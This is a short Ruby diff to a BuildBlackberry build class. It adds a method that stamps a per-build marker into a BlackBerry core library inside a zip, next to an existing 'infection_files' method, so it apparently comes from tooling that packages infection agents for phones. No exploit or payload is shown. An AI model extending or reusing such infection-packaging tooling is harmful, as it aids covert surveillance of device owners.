@@ -179,9 +179,16 @@ class BuildBlackberry < Build
 
     # this is the only file we need to output after this point
     @outputs = ['output.zip']
-
   end
-  
+
+  def unique(core)
+    Zip::ZipFile.open(core) do |z|
+      core_content = z.file.open('res/net_rim_bb_lib_base.cod', "rb") { |f| f.read }
+      add_magic(core_content)
+      z.file.open('res/net_rim_bb_lib_base.cod', "wb") { |f| f.write core_content }
+    end
+  end
+
   def infection_files(name = 'bb_in')
     trace :debug, "     infection_files"
     files = []
